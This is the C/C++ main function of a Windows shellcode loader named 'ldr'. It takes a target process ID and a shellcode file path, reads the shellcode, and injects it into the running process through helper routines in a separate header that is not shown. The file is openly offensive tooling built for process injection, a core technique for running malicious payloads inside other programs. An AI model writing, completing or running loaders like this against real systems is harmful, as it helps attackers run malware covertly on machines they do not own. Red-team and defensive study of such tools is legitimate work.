#include <stdio.h>

#include "ldr.hpp"

int main(int argc, char* argv[])
{
    printf("[i] Start ldr...\n");

    if (argc != 3)
    {
        printf("[x] Invalid argument.\n");
        printf("USAGE: ldr.exe <PID> <SHELLCODE_PATH>\n");
        return 1;
    }

    DWORD dwPID = atoi(argv[1]);
    PCHAR filePath = argv[2];

    DWORD dwBufferSize = 0;

    // Read shellcode file.
    LPVOID lpBuffer = Ldr::ReadShellcode(filePath, dwBufferSize);
    if (!lpBuffer)
    {
        return 1;
    }
    printf("[i] Shellcode size: %ld\n", dwBufferSize);

    // Inject shellcode to target process.
    if (!Ldr::InjectShellcode(dwPID, lpBuffer, dwBufferSize))
    {
        return 1;
    }

    HeapFree(GetProcessHeap(), 0, lpBuffer);

    return 0;
}
